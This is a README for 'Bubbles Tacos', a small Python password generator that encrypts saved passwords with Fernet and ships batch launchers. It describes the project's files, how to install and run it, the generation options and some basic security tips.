# Bubbles Tacos

**Bubbles Tacos** is a Python-based tool for securely generating, encrypting, and managing passwords. It utilizes `cryptography` for encryption and ensures that passwords are safely stored.

## Features

- **Password Generation:** Generate highly secure and customizable passwords with options for length, character types, and exclusion of similar-looking characters.
- **Password Encryption:** Encrypt and save passwords securely using the Fernet encryption from `cryptography`.
- **Password Decryption:** View stored passwords by decrypting them securely.
- **Batch Script Launchers:** Use `main-launcher.bat` to generate and save passwords, or `decrypt.bat` to view them conveniently.

## Files

- `main.py`: Contains the main functions for password generation, encryption, and secure storage.
- `de.py`: Handles the decryption and viewing of saved passwords.
- `main-launcher.bat`: Batch script to run the password generation script easily.
- `decrypt.bat`: Batch script to run the password decryption script easily.
- `requirements.txt`: Lists the Python dependencies required for the project.

## Requirements

- [Python 3.11.6](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)
    - click `add to path` bottom button click that before continuing to install python. 
    - **MAKE SURE TO CLICK `ADD TO PATH`. 

- Required Python packages:
    ```
    cryptography
    ```

## Installation

1. How To Download Repo 
[How-To-Download-Repo](https://www.gitprojects.fnbubbles420.org/how-to-download-repos)

2. Install the dependencies:

```
pip install -r requirements.txt
```

## Usage

### Generating and Saving Passwords

1. Run the `main.py` script:

```
python main.py
```

- Alternatively, run the `main-launcher.bat` to launch the password generator.

2. A secure password will be generated, encrypted, and saved in the `secure_folder/passwords.enc` file.

### Viewing Saved Passwords

1. Run the `de.py` script:

```
python de.py
```

- Alternatively, run the `decrypt.bat` to decrypt and view saved passwords.

2. The script will securely decrypt and display all stored passwords.

## Customization

You can customize password generation in `main.py` using the following parameters:

- `length`: Length of the password (default: 16).

- `use_uppercase`: Include uppercase letters (default: `True`).

- `use_digits`: Include digits (default: `True`).

- `use_special`: Include special characters (default: `True`).

- `exclude_similar`: Exclude visually similar characters like `O`, `0`, `l`, `1` (default: `False`).

**Example:**

```
generated_password = generate_password(length=20, exclude_similar=True)
```

# Security Considerations

- `Protect your encryption key`: Ensure that the `secure_folder/encryption`.key file is stored securely. Losing this key will make it impossible to decrypt the stored passwords.
- `Keep passwords private`: Do not share the `passwords.enc` file without the corresponding encryption key.
- `Use environment-based debugging`: Use environment variables to ensure debugging logs are only shown in development environments.

## License

- This project is licensed under the MIT License. See `LICENSE` for details.

---
---
### Happy securing your passwords with bubbles-secure-tool!
---
---
